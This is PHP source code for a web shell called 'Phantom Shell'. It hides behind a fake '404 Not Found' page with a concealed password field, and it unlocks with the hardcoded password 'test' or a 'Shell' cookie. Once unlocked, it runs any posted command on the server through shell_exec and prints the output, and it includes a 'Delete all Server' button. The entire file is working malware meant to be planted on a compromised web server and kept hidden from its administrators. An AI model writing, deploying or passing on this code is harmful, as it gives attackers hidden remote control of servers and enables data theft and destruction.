<?php

if($_POST['password'] == 'test' || $_COOKIE['Shell'] == true): 

    session_start();

    setcookie('Shell', true);

    $dir = shell_exec('pwd');


?>

<!DOCTYPE html>
<html lang="en">
<head>
    <style>
        *{
            margin: 0;
            padding: 0;
        }
    </style>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Phantom Shell</title>
</head>
<body style="background-color: #0D1117;">
<center>
    <pre style="color : #1ec81e; font-size: 20px;">
    
     ____  _                 _                    ____  _          _ _ 
    |  _ \| |__   __ _ _ __ | |_ ___  _ __ ___   / ___|| |__   ___| | |
    | |_) | &apos;_ \ / _` | &apos;_ \| __/ _ \| &apos;_ ` _ \  \___ \| &apos;_ \ / _ \ | |
    |  __/| | | | (_| | | | | || (_) | | | | | |  ___) | | | |  __/ | |
    |_|   |_| |_|\__,_|_| |_|\__\___/|_| |_| |_| |____/|_| |_|\___|_|_|

 ____  _____ _____  _    
| __ )| ____|_   _|/ \   
|  _ \|  _|   | | / _ \  
| |_) | |___  | |/ ___ \ 
|____/|_____| |_/_/   \_\
                         

    
  <input style="padding: 3px; background-color: rgba(0, 0, 0, 0); border-radius: 7px; border-color: #232930; color : red; font-size: 25px" type="button" value="Delete all Server">

    </pre>
</center>
<br />

<form method="POST">
<label style="color : #1ec81e; font-size: 25px;"><?php echo $dir; ?> : </label><input style="font-size : 24px; color: #C3CBD9; background-color : rgba(0, 0, 0, 0); border-color: rgba(0, 0, 0, 0); " type="text" name="query" />
</from>

<?php

$command = shell_exec($_POST['query']);

echo '<pre style="color: #C3CBD9; margin-top: 20px; color: white; background-color: #232930; padding: 25px; font-size: 20px; ">'.$command.'</pre>';

?>

</body>
</html>

<?php

else:

?>

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<p>Additionally, a 404 Not Found
error was encountered while trying to use an ErrorDocument to handle the request.</p>
</body></html>
<form method="POST">
    <input style="border-color: rgba(255, 255, 255, 0); margin-top: 80px; " type="password" name="password">

</form>

<?php

endif;

